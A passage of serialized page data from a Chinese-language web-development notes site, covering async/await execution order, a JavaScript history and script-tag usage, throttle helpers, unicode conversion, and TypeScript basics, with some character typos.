promise.resolve("2");\n}\nasync function testasync() {\n    console.log("3");\n    return promise.resolve("4");\n}\nasync function test() {\n    console.log("5");\n    // await promise.resolve("2")，状态是`fulfilled`\n    const v1 = await testsometing();\n    console.log(v1);\n    const v2 = await testasync();\n    console.log(v2);\n}\n\ntest();\n\nconst promise = new promise((resolve)=> {\n    console.log("6");\n    resolve("7");\n});\npromise.then((val)=> console.log(val));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n// 输出依次为5 1 6 2 3 7 4\nasync function testsometing() {\n    console.log("1");\n    return "2";\n}\nasync function testasync() {\n    console.log("3");\n    return promise.resolve("4");\n}\nasync function test() {\n    console.log("5");\n    // await promise.resolve("2")，状态是`fulfilled`\n    const v1 = await testsometing();\n    console.log(v1);\n    const v2 = await testasync();\n    console.log(v2);\n}\n\ntest();\n\nconst promise = new promise((resolve)=> {\n    console.log("6");\n    resolve("7");\n});\npromise.then((val)=> console.log(val));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n// 输出依次为5 1 6 7 2 3 4\nasync function testsometing() {\n    console.log("1");\n    return promise.resolve("2");\n}\nasync function testasync() {\n    console.log("3");\n    return promise.resolve("4");\n}\nasync function test() {\n    console.log("5");\n    // testsometing()里用了async标识，并且返回是`return promise.resolve("2")`\n    // 这会导致要经过resolvepromise(promise, resolution)的处理，入参promise是\n    // testsometing()对外暴露的promise对象，入参resolution是promise.resolve("2")\n    // 处理完后`await testsometing()`这里才`fulfilled`，那么`7`会先于`2`打印\n    const v1 = await testsometing();\n    console.log(v1);\n    const v2 = await testasync();\n    console.log(v2);\n}\n\ntest();\n\nconst promise = new promise((resolve)=> {\n    console.log("6");\n    resolve("7");\n});\npromise.then((val)=> console.log(val));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n要解释上面这些例子必须先弄懂不带async/await的异步执行顺序问题，也就是resolve一个promise对象的内容。\n\n然后还要知道async函数的对外暴露的得是一个promise对象，如果在sync函数内部return v;，它的处理和then()一样：\n\n * 如果return v;语句的值是一个是普通值，那async函数的对外暴露的promise对象其实就是将这个普通值v包装成已经fulfilled的promise对象。\n * 如果return v;语句的值本就是一个promise对象，那么底层会调用resolvepromise(promise, resolution)处理，入参promise就是async函数的对外暴露的promise对象，入参resolution就是v这个promise对象。会经过promiseresolvethenablejob的创建和运行（占用两个microtask时序），最后让async函数的对外暴露的promise对象的状态变为fulfilled。\n\n最后还要知道await等到的值是普通值是会被promise.resolve()进行隐式转换（转换后是fulfilled的）。',charsets:{cjk:!0}},{title:"JavaScript简介和使用方法",frontmatter:{},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/",relativePath:"book-web/html、css、js、ts/学习JavaScript/README.md",key:"v-40fcf06a",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/",headers:[{level:2,title:"JavaScript简史",slug:"javascript简史",normalizedTitle:"javascript简史",charIndex:24},{level:2,title:"JavaScript实现",slug:"javascript实现",normalizedTitle:"javascript实现",charIndex:277},{level:3,title:"ECMAScript",slug:"ecmascript",normalizedTitle:"ecmascript",charIndex:360},{level:3,title:"文档对象模型(DOM)",slug:"文档对象模型-dom",normalizedTitle:"文档对象模型(dom)",charIndex:953},{level:3,title:"浏免器对象模型(CO0M)",slug:"浏免器对象模型-co0m",normalizedTitle:"浏免器对象模型(co0m)",charIndex:1281},{level:2,title:"在HTML中使用JavaScript",slug:"在html中使用javascript",normalizedTitle:"在html中使用javascript",charIndex:1334},{level:3,title:"<script\\>元素和放置",slug:"script-元素和放置",normalizedTitle:"&lt;script&gt;元素和放置",charIndex:null},{level:3,title:"扩展",slug:"扩展",normalizedTitle:"扩展",charIndex:628}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"JavaScript简史 JavaScript实现 ECMAScript 文档对象模型(DOM) 浏免器对象模型(CO0M) 在HTML中使用JavaScript <script\\>元素和放置 扩展",content:'# JavaScript简介和使用方法\n\n\n# JavaScript简史\n\n    上个世纪九十年代，人们普遍使用电话拨号上网，并且网页的大小、复杂性不断增加，提交一个表单请本需要等很久时间的响应，如果必填域没填或输入无效值那就更加费时。\n    为了处理这种简单的验证，Netscape公司的布兰登·艾奇(Brendan Eich)在1995年与Sun公司合作开发出Live Script客户端脚本语言(服务器端也可使用，名叫Live Wire)，发布前夕为搭上热炒Java的顺风车改名为JavaScript。\n    因微软也推出名为JScript的JavaScript实现语言，两不同版本暴露出非标准化系列问题。1997年，ECMA的TC39以JavaScript1.1为蓝本完成了ECMA-262——定义一种名为ECMAScript的新脚本语言的标准。\n    第二年，ISO/IEC也采用了ECMAScript作为标准，自此各浏觉器开发商将ECMAScript作为各自JavaScript实现的基础。\n\n\n# JavaScript实现\n\n虽然JavaScript和ECMAScript通常被人们用来表达相同的含义，但JavaScript的含义却比ECMA-262中规定的要多得多，如下图。\n\n\n\n# ECMAScript\n\n    Web浏览器是ECMAScript实现的宿主环境之一，不仅提供基本的ECMAScript实现，同时也会提供该语言的扩展(例如DOM)以便语言与环境之间对接交互。其宿主环境有Node和Adobe Flash。\n    ECMAScript就是对实现ECMA-262标准规定的各个方面内容的语言的描述。ECMA-262标准规定了ECMAScript语言的组成部防：语法、类型、语句、关键字、保留字、操作符、对象。\n    ECMA-262第1版册除了所有针对浏览器的代码并作了小改动：支持Unicode标准，对象变得与平台无关。\n    ECMA-262第3版修改了：字符串处理、错误定义、数值输出。新增了正则表达式、新控制语句try-catch异常处理。\n    ECMA-262第5版新增：JSON对象、继承的方法和高级属性定义，另外还包含一种严格模式。\n\n\n# 文档对象模型(DOM)\n\n    文档对象模型是针对XML但经过扩展用于HTML的应用程序编程接口(API)。DOM把整个页面映射为一个多层节点结构。开发人员首次无需重新办载网页，就可以借助DOM提供的API对网页的外观和内容进行修改。\n    DOM1级由DOM核心(DOM Core)和DOM HTML组成，DOM核心规定了如何映射基于XML的文档结构，DOM HTML在DOM核心上扩展了针对HTML的对象和方法。\n    DOM2级在原DOM上扩充了鼠标和用户界面事件、范国、遍历等细分模块，而且通过对象接口增加了对CSS的支持。\n    DOM3级引入了以统一方式加载和保存文档的方法，新增了验证文挡的方法。也开始支持XML1.0规范。\n\n\n# 浏免器对象模型(CO0M)\n\n也是一种接口，用来处理浏览器窗口和框架及扩展，HTML5给了标准。\n\n\n# 在HTML中使用JavaScript\n\n\n# <script>元素和放置\n\n<script>定义了6个元素：async(异步脚本)、charset(用得少)、defer(延迟脚本)、language(已废弃)、src(外部文件)、type(替代language)\n\n<script>的使用方式：\n\n 1. 直接在页面中嵌入JavaScript代码，在<script>和<\/script>之间写JavaScript代码，如果代码里的字符串中有<\/script>这样的标签记得要使用 “/” 进行转译。\n    \n    <script type="text/javascript">\n        function sayScript() {\n            alert("<\\/script>");\n        }\n    <\/script>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. 在页面引入JavaScript文件，<script type="text/javascript" src="xxx.js"><\/script>\n    \n    * 在HTML不能简写<script />，但在XHTML里可以；\n    * src中可以引用外部域的JavaScript文件，但该JavaScript文件要安全可靠；\n    * 一般推荐放在页面主要内容后，</body>标签前，因为放在<head>标签中的话会先下载JavaScript文件来解析页面就可能会出现空白的间隙；\n    * 解决上面的问题可以用defer="defer"，把<script src="xxx.js" defer="defer"><\/script>放在<head>标签里，代表立即下载但延迟执行；\n    * 与defer类似有async，在<head>标签可放多个引用的JavaScript文件，立即下载这些JavaScript但执行顺序不保证，即多个文件要没关联。\n\n\n# 扩展\n\n * 引入型的<script type="text/javascript" src="xxx.js"><\/script>中，是不会再有嵌在<script>和<\/script>中的代码，有也不会执行只会执行src里的文件。\n * 使用<noscript>元素可以指定在不支持脚本的浏览器中显示的替代内容，但在启用了脚本的情况下浏览器不会显示<noscript>元素中的任何内容。',normalizedContent:'# javascript简介和使用方法\n\n\n# javascript简史\n\n    上个世纪九十年代，人们普遍使用电话拨号上网，并且网页的大小、复杂性不断增加，提交一个表单请本需要等很久时间的响应，如果必填域没填或输入无效值那就更加费时。\n    为了处理这种简单的验证，netscape公司的布兰登·艾奇(brendan eich)在1995年与sun公司合作开发出live script客户端脚本语言(服务器端也可使用，名叫live wire)，发布前夕为搭上热炒java的顺风车改名为javascript。\n    因微软也推出名为jscript的javascript实现语言，两不同版本暴露出非标准化系列问题。1997年，ecma的tc39以javascript1.1为蓝本完成了ecma-262——定义一种名为ecmascript的新脚本语言的标准。\n    第二年，iso/iec也采用了ecmascript作为标准，自此各浏觉器开发商将ecmascript作为各自javascript实现的基础。\n\n\n# javascript实现\n\n虽然javascript和ecmascript通常被人们用来表达相同的含义，但javascript的含义却比ecma-262中规定的要多得多，如下图。\n\n\n\n# ecmascript\n\n    web浏览器是ecmascript实现的宿主环境之一，不仅提供基本的ecmascript实现，同时也会提供该语言的扩展(例如dom)以便语言与环境之间对接交互。其宿主环境有node和adobe flash。\n    ecmascript就是对实现ecma-262标准规定的各个方面内容的语言的描述。ecma-262标准规定了ecmascript语言的组成部防：语法、类型、语句、关键字、保留字、操作符、对象。\n    ecma-262第1版册除了所有针对浏览器的代码并作了小改动：支持unicode标准，对象变得与平台无关。\n    ecma-262第3版修改了：字符串处理、错误定义、数值输出。新增了正则表达式、新控制语句try-catch异常处理。\n    ecma-262第5版新增：json对象、继承的方法和高级属性定义，另外还包含一种严格模式。\n\n\n# 文档对象模型(dom)\n\n    文档对象模型是针对xml但经过扩展用于html的应用程序编程接口(api)。dom把整个页面映射为一个多层节点结构。开发人员首次无需重新办载网页，就可以借助dom提供的api对网页的外观和内容进行修改。\n    dom1级由dom核心(dom core)和dom html组成，dom核心规定了如何映射基于xml的文档结构，dom html在dom核心上扩展了针对html的对象和方法。\n    dom2级在原dom上扩充了鼠标和用户界面事件、范国、遍历等细分模块，而且通过对象接口增加了对css的支持。\n    dom3级引入了以统一方式加载和保存文档的方法，新增了验证文挡的方法。也开始支持xml1.0规范。\n\n\n# 浏免器对象模型(co0m)\n\n也是一种接口，用来处理浏览器窗口和框架及扩展，html5给了标准。\n\n\n# 在html中使用javascript\n\n\n# <script>元素和放置\n\n<script>定义了6个元素：async(异步脚本)、charset(用得少)、defer(延迟脚本)、language(已废弃)、src(外部文件)、type(替代language)\n\n<script>的使用方式：\n\n 1. 直接在页面中嵌入javascript代码，在<script>和<\/script>之间写javascript代码，如果代码里的字符串中有<\/script>这样的标签记得要使用 “/” 进行转译。\n    \n    <script type="text/javascript">\n        function sayscript() {\n            alert("<\\/script>");\n        }\n    <\/script>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. 在页面引入javascript文件，<script type="text/javascript" src="xxx.js"><\/script>\n    \n    * 在html不能简写<script />，但在xhtml里可以；\n    * src中可以引用外部域的javascript文件，但该javascript文件要安全可靠；\n    * 一般推荐放在页面主要内容后，</body>标签前，因为放在<head>标签中的话会先下载javascript文件来解析页面就可能会出现空白的间隙；\n    * 解决上面的问题可以用defer="defer"，把<script src="xxx.js" defer="defer"><\/script>放在<head>标签里，代表立即下载但延迟执行；\n    * 与defer类似有async，在<head>标签可放多个引用的javascript文件，立即下载这些javascript但执行顺序不保证，即多个文件要没关联。\n\n\n# 扩展\n\n * 引入型的<script type="text/javascript" src="xxx.js"><\/script>中，是不会再有嵌在<script>和<\/script>中的代码，有也不会执行只会执行src里的文件。\n * 使用<noscript>元素可以指定在不支持脚本的浏览器中显示的替代内容，但在启用了脚本的情况下浏览器不会显示<noscript>元素中的任何内容。',charsets:{cjk:!0}},{title:"js部分",frontmatter:{},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/js%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86%E5%92%8C%E6%A1%88%E4%BE%8B.html",relativePath:"book-web/html、css、js、ts/学习JavaScript/js零碎知识和案例.md",key:"v-638c9070",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/js%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86%E5%92%8C%E6%A1%88%E4%BE%8B.html",headers:[{level:2,title:"节流器",slug:"节流器",normalizedTitle:"节流器",charIndex:11},{level:2,title:"中文和unicode互转",slug:"中文和unicode互转",normalizedTitle:"中文和unicode互转",charIndex:1270},{level:2,title:"判断引用指向的对象是否相同",slug:"判断引用指向的对象是否相同",normalizedTitle:"判断引用指向的对象是否相同",charIndex:1713}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"节流器 中文和unicode互转 判断引用指向的对象是否相同",content:"# js部分\n\n\n# 节流器\n\n/**\n * 节流器1：先执行再延时，“相对实时”效果最好，但是最后一次关键点触发可能会被节流掉\n * fn：执行函数\n * wait：等待时间\n */\nfunction throttle(fn, wait) {\n    let timer = null;\n    return function () {\n        if (!timer) {\n            fn && fn.apply(this, arguments);\n            timer = setTimeout(() => {\n                timer = null;\n            }, wait);\n        }\n    }\n}\n/**\n * 节流器2：先延时再执行，有较好的“相对实时”的效果，并且最后一次触发不会被节流掉\n * fn：执行函数\n * wait：等待时间\n */\nfunction throttle2(fn, wait) {\n    let timer = null;\n    return function () {\n        if (!timer) {\n            timer = setTimeout(() => {\n                // 这里的this和arguments就是return function这个函数的this和arguments\n                //（箭头函数没有自己的this，arguments，super或new.target）\n                fn && fn.apply(this, arguments);\n                timer = null;\n            }, wait)\n        }\n    }\n}\n/**\n * 节流器3：先延时后执行，“相对实时”的效果很差（定时器一直会被覆盖），但最后一次触发不会被节流\n * fn：执行函数\n * wait：等待时间\n */\nconst throttle3 = function (fn, wait) {\n    let timer = null;\n    return function () {\n        timer && clearTimeout(timer);\n        timer = setTimeout(() => {\n            fn && fn.apply(this, arguments);\n        }, wait);\n    }\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# 中文和unicode互转\n\n// 汉字转unicode\nexport function escapeCode(str: string) {\n    if (!str) {\n        return '';\n    }\n    return str.replace(/[^\\u0000-\\u00FF]/g, function ($0) { return escape($0).replace(/(%u)(\\w{4})/gi, \"&#x$2;\") });\n}\n\n// unicode转换为汉字\nexport function unescapeCode(str: string) {\n    if (!str) {\n        return '';\n    }\n    return unescape(str.replace(/&#x/g, '%u').replace(/;/g, ''));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 判断引用指向的对象是否相同\n\nObject.is(a, b)是用于判断a和b是否指向同一个对象，也就是地址值相同（引用不是同一个，是两个引用）。\n\nconst a = { x: 100 };\nconst b = a;     // 把a的地址值复制给了b，它们指向同一个对象 { x: 100 }\nconsole.log(Object.is(a, b)); // true\n\nconst c = { x: 200 };\nconst d = { x: 200 };\nconsole.log(Object.is(c, d)); // false，虽然对象内容一样，但是对象不是同一个，随之地址值也不一样\n\n\n1\n2\n3\n4\n5\n6\n7\n",normalizedContent:"# js部分\n\n\n# 节流器\n\n/**\n * 节流器1：先执行再延时，“相对实时”效果最好，但是最后一次关键点触发可能会被节流掉\n * fn：执行函数\n * wait：等待时间\n */\nfunction throttle(fn, wait) {\n    let timer = null;\n    return function () {\n        if (!timer) {\n            fn && fn.apply(this, arguments);\n            timer = settimeout(() => {\n                timer = null;\n            }, wait);\n        }\n    }\n}\n/**\n * 节流器2：先延时再执行，有较好的“相对实时”的效果，并且最后一次触发不会被节流掉\n * fn：执行函数\n * wait：等待时间\n */\nfunction throttle2(fn, wait) {\n    let timer = null;\n    return function () {\n        if (!timer) {\n            timer = settimeout(() => {\n                // 这里的this和arguments就是return function这个函数的this和arguments\n                //（箭头函数没有自己的this，arguments，super或new.target）\n                fn && fn.apply(this, arguments);\n                timer = null;\n            }, wait)\n        }\n    }\n}\n/**\n * 节流器3：先延时后执行，“相对实时”的效果很差（定时器一直会被覆盖），但最后一次触发不会被节流\n * fn：执行函数\n * wait：等待时间\n */\nconst throttle3 = function (fn, wait) {\n    let timer = null;\n    return function () {\n        timer && cleartimeout(timer);\n        timer = settimeout(() => {\n            fn && fn.apply(this, arguments);\n        }, wait);\n    }\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# 中文和unicode互转\n\n// 汉字转unicode\nexport function escapecode(str: string) {\n    if (!str) {\n        return '';\n    }\n    return str.replace(/[^\\u0000-\\u00ff]/g, function ($0) { return escape($0).replace(/(%u)(\\w{4})/gi, \"&#x$2;\") });\n}\n\n// unicode转换为汉字\nexport function unescapecode(str: string) {\n    if (!str) {\n        return '';\n    }\n    return unescape(str.replace(/&#x/g, '%u').replace(/;/g, ''));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 判断引用指向的对象是否相同\n\nobject.is(a, b)是用于判断a和b是否指向同一个对象，也就是地址值相同（引用不是同一个，是两个引用）。\n\nconst a = { x: 100 };\nconst b = a;     // 把a的地址值复制给了b，它们指向同一个对象 { x: 100 }\nconsole.log(object.is(a, b)); // true\n\nconst c = { x: 200 };\nconst d = { x: 200 };\nconsole.log(object.is(c, d)); // false，虽然对象内容一样，但是对象不是同一个，随之地址值也不一样\n\n\n1\n2\n3\n4\n5\n6\n7\n",charsets:{cjk:!0}},{title:"1.typescript基础",frontmatter:{title:"1.typescript基础"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0TypeScript/1.typescript%E5%9F%BA%E7%A1%80.html",relativePath:"book-web/html、css、js、ts/学习TypeScript/1.typescript基础.md",key:"v-756eb3ee",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0TypeScript/1.typescript%E5%9F%BA%E7%A1%80.html",headers:[{level:2,title:"静态类型的理解",slug:"静态类型的理解",normalizedTitle:"静态类型的理解",charIndex:19},{level:2,title:"基础和复杂类型",slug:"基础和复杂类型",normalizedTitle:"基础和复杂类型",charIndex:193},{level:2,title:"类型注解和类型推断",slug:"类型注解和类型推断",normalizedTitle:"类型注解和类型推断",charIndex:571},{level:2,title:"函数",slug:"函数",normalizedTitle:"函数",charIndex:985},{level:2,title:"数组和元组",slug:"数组和元组",normalizedTitle:"数组和元组",charIndex:2337},{level:2,title:"接口",slug:"接口",normalizedTitle:"接口",charIndex:3030},{level:3,title:"接口约束对象",slug:"接口约束对象",normalizedTitle:"接口约束对象",charIndex:3160},{level:3,title:"接口的实现与继承",slug:"接口的实现与继承",normalizedTitle:"接口的实现与继承",charIndex:4368},{level:3,title:"接口约束函数",slug:"接口约束函数",normalizedTitle:"接口约束函数",charIndex:5519},{level:3,title:"接口约束数组",slug:"接口约束数组",normalizedTitle:"接口约束数组",charIndex:5825},{level:2,title:"类",slug:"类",normalizedTitle:"类",charIndex:21},{level:2,title:"联合类型和类型保护",slug:"联合类型和类型保护",normalizedTitle:"联合类型和类型保护",charIndex:7879},{level:2,title:"枚举类型",slug:"枚举类型",normalizedTitle:"枚举类型",charIndex:9104},{level:2,title:"tsconfig.json",slug:"tsconfig-json",normalizedTitle:"tsconfig.json",charIndex:9865}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"静态类型的理解 基础和复杂类型 类型注解和类型推断 函数 数组和元组 接口 接口约束对象 接口的实现与继承 接口约束函数 接口约束数组 类 联合类型和类型保护 枚举类型 tsconfig.json",content:"# typescript基础\n\n\n# 静态类型的理解\n\n当变量的类型确定下来时，变量的类型在后面是无法修改的，还有一点就是该变量可以使用该类型上的所有公共方法和公共属性。\n\nconst num: number = 1.2; // 后面无法修改到其他类型\nnum.toFixed(0);          // 可以使用数值类型上的toFixed方法，保留0位小数\n\n\n1\n2\n\n\n\n# 基础和复杂类型\n\n因为ts是js的超集，所以js的类型都存在于ts里。基础类型有null、undefined、number、boolean、string、symbol，也叫简单类型。而复杂类型是由Object为代表的，它有一些子类，比如Array、Function和自定义的复杂类型。\n\nconst num: number = 1;          // number\nconst str: string = 'a';        // string\nconst bool: boolean = false;    // boolean\nconst person: { name: string, age: number } = { name: 'Bob', age: 25 }; // 自定义的复杂类型（也是对象类型）\n\n\n1\n2\n3\n4\n\n\n\n# 类型注解和类型推断\n\n**类型注解(type annotation)**声明变量时，给变量做的类型约束，是为了告诉ts和开发者该变量是个什么类型。\n\n**类型推断(type inference)**如果声明的变量不给做类型注解，那么ts会根据你赋的值来推断它是个什么类型。\n\nconst num: number = 1;  // 其中: number就是类型注解\nconst str = 'a';        // 会根据'a'推断出str是一个string类型\n\n\n1\n2\n\n\n如果定义的是常量并且使用的是基本类型的值，那就可以不用做类型注解。像上面的num就可以省略：const num = 1;。\n\n在方法中传参就得做类型注解，即使你传的是基本类型，因为ts无法推测你的方法应该传什么，可能永远都不会调用所以它推不出来，而方法的会返回值可以通过return的类型来推测，所以方法的返回接收值可以不用做类型注解。\n\n\n# 函数\n\n函数Function是基于Object的，它主要用于描述一类行为，执行一些特定的代码，可以参考查看js里的function类型。\n\n * 一般的，函数的入参是要做类型注解的。因为ts没有根据去推测函数入参的类型的，它的调用处是多样性的，所以必须给函数入参做严格限制，才能保证不影响到函数内部的一些执行。\n\n * 而函数的返回值可以不用做类型注解，因为可以依赖于return来推测，但是函数没有return时又偏偏后期某个时间点给它加上了return，这会影响到所有的调用点，那最好还是给函数的返回值做注解。具体是有return就做具体类型注解，没有return需求就使用void做类型注解。\n   \n   function demo(data: { x: number, y: number }) { // x,y必须做类型注解\n       const x = Number(data.x.toFixed(1));\n       return x + data.y;\n   }\n   const result = demo({ x: 1.2, y: 2 });          // result可以不用做类型注解\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n * 有个经常犯错的场景，就是函数的参数使用解构语法，很容易把对象解构和类型注解混在一个对象里写。下面这个示例与上面一点里的示例非常像，其实你仔细看后面的类型注解一模一样的，只是前面的data换成了解构写法而已。\n   \n   // 入参千万别只写个{ x: number, y: number }就完事了，前面要加上{ x, y }:\n   function demo({ x, y }: { x: number, y: number }): void { // 没有返回值，函数返回类型注解为void\n       console.log(x + y);\n   }\n   demo({ x: 1.2, y: 2 });\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n * 还有函数类型本身的一个注解，可以使用(入参注解) => 返回值注解，也可以直接使用Function，不过还是推荐使用interface来约束函数类型，下面小节里会讲。\n   \n   const func: (x: number, y:number) => string = (x: number, y: number): string => {\n       return (x + y).toString();\n   };\n   const func1: Function = (x: number, y: number): string => { // Function也可以，其实上一种更具约束力\n       return (x + y).toString();\n   };\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n总的来说，函数入参的类型注解一定要做并且要区分普通的和解构的，然后函数的返回值也要做类型注解用来约束函数的返回值。\n\n\n# 数组和元组\n\n我们知道js的数组是可以存不同类型的值，数组的长度也是动态改变的，详情可以查看js的array类型。\n\n而ts的数组会有限制，可以限定你的数组里的元素只能是哪些类型。ts还有一个元组，它的限定等级更高，它首先限定数组的元素数量再限定具体位置上是什么类型的元素。\n\n// 数组\nconst arr1: number[] = [1, 2, 3, 4];\nconst arr2: Array<number> = [1, 2, 3, 4];           // 数组配合泛型使用\nconst arr3: (number | string)[] = [1, 2, '3', 4];   // 数组配合联合类型使用\n// 其实可以使用数组配合泛型（Array<T>）替代这个复杂写法\nconst arr4: { name: string, age: number }[] = [{ name: 'Sandy', age: 15 }, { name: 'Marry', age: 18 }];\n// 元组\nconst arr5: [string, string, number] = ['1', '2', 3];\n// 数据简单属性少就可以用元组替代对象数组（Array<T>），因为它约束更强，就是一个位置一个位置约定还是很麻烦的\nconst arr6: [string, string, number][] = [['Sandy', 'student', 15], ['Marry', 'student', 18]];\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 接口\n\n在其他语言里接口是给具有类似行为或属性的事物制作一个顶级的模板，用于约束这一类事物，里面有抽象的属性和方法而并不实现它们。\n\njs没有接口，而ts引进了接口。作用和其他语言类似也是为了约束一类事物，但由于js的缘故，ts的接口使用起来更灵活。\n\n\n# 接口约束对象\n\n接口可以约束普通的对象，跟普通的class写法类似，但是它只能书写抽象的属性和方法，也就是说不能为它们进行赋值（不能立马实现）。\n\ninterface Idata {           // 接口来约束对象\n    name: string;           // 必填属性\n    readonly age: number;   // 只读属性\n    email?: string;         // 可选属性\n}\nfunction doSome(person: Idata): string {\n    return person.name;\n}\nfunction doSome1(person: Idata): string {\n    return person.name + person.age.toString();\n}\nconst person = { name: 'Sandy', age: 15, email: 'ss@qq.com', profession: 'student' };\ndoSome(person);                    // 传的是对象指针，不会做强校验，也就说参数可以多但不能少\ndoSome1({ name: 'Bob', age: 19 }); // 传的是对象字面量，会对它做强校验，不符合就会报错\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n除了上面的这些用法，还可以往接口里加函数方法，能对函数方法进行约束，同样的也不能对它进行具体的实现。\n\ninterface Idata {\n    name: string;           // 必填属性\n    readonly age: number;   // 只读属性\n    email?: string;         // 可选属性\n    sayAge(): number;       // 方法，返回值必须是规定类型的，不然会报错\n}\nfunction doSome(person: Idata): void {\n    console.log(person.sayAge());\n}\nconst person = {\n    name: 'Sandy',\n    age: 15,\n    email: 'ss@qq.com',\n    profession: 'student',\n    sayAge: () => { return person.age } // 必须同接口里的一样定义相同的返回值\n};\ndoSome(person); // 传的是对象指针person，不会做强校验，也就是参数可以多但是不能少\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 接口的实现与继承\n\n除了上述这种直接用于对象的约束，接口当然也能像传统接口的一样使用类来implements（实现）\n\ninterface Idata {\n    name: string;           // 必填属性\n    readonly age: number;   // 只读属性\n    email?: string;         // 可选属性\n    sayAge(): number;       // 方法，返回值必须是规定类型的，不然会报错\n}\nclass Person implements Idata {\n    name: string;           // 必填属性\n    readonly age: number;   // 只读属性\n    email?: string;         // 可选属性\n    constructor() { }       // 构造函数\n    sayAge = (): number => { return this.age } // 方法，返回值必须是规定的，不然报错\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n接口也能继承接口\n\ninterface Idata {\n    name: string;           // 必填属性\n    readonly age: number;   // 只读属性\n    email?: string;         // 可选属性\n    sayAge(): number;       // 方法，返回值必须是规定类型的，不然会报错\n}\ninterface IPerson extends Idata {\n    sayName(): string;      // 新增方法\n}\nclass Person implements IPerson {\n    name: string;           // 必填属性\n    readonly age: number;   // 只读属性\n    email?: string;         // 可选属性\n    constructor() { }       // 构造函数\n    sayAge = (): number => { return this.age }   // 方法，返回值必须是规定的，不然报错\n    sayName = (): string => { return this.name };// 方法，返回值必须是规定的，不然报错\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 接口约束函数\n\n接口可以约束一个函数对象，函数对象本来就是继承自Object，只是接口是对函数的入参和出参进行约束的（忽略方法体），而对象是对对象的属性进行约束的（忽略属性值）。但只要记住接口的写法都是类似于class的，不管它约束谁。\n\n比如下面这个是函数类型注解的一种改造：\n\ninterface Ifunc {\n    (x: number, y: number): string;\n}\nconst func: Ifunc = (x: number, y: number): string => {\n    return (x + y).toString();\n};\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 接口约束数组\n\n数组除了可以(number | string)[]，或者[string, number, string]进行类型注解，也可以配合接口对数组进行类型注解。\n\ninterface Iarr {\n    [index: number]: string;\n}\nconst arr: Iarr = ['1', '2', '3'];\n\n\n1\n2\n3\n4\n\n\n\n# 类\n\nes6之前都是使用原型链来实现继承（甚至要配合构造函数和call）会比较麻烦，es6推出了class方式的继承，同样的ts也能使用class方式继承。\n\nclass X {\n    a: string = 'a';                    // 公共属性（都可访问）\n    public b: string = 'b';             // 公共属性（都可访问）\n    protected c: string = 'c';          // 受保护属性（自己和子类可访问）\n    private _d: string = 'd';           // 私有属性（只有自己可访问）\n    get d(): string { return this._d; } // 通过暴露的方法来间接操作私有属性\n    set d(d: string) { this._d = d; }   // 通过暴露的方法来间接操作私有属性\n    constructor() { }                   // 构造函数\n    funcA() { }                         // 公共方法\n    public funcB() { }                  // 公共方法\n    protected funcC() { }               // 受保护方法（自己和子类可访问）\n    private funcD() { }                 // 私有方法（只有自己可访问）\n}\nclass Y extends X {                     // 继承一个，可以继承到受保护的和公共方法\n    a: string = 'a';                    // 重写覆盖\n    public b: string = 'b';             // 重写覆盖\n    protected c: string = 'c';          // 重写覆盖\n    // private _d: string  = 'd';       // 无法重写覆盖，因为它是父类私有的属性\n    constructor() { super(); }          // 构造函数必须第一行就调用super();\n    funcA() { }                         // 重写覆盖\n    public funcB() { }                  // 重写覆盖\n    protected funcC() { }               // 重写覆盖\n    // private funcD() { }              // 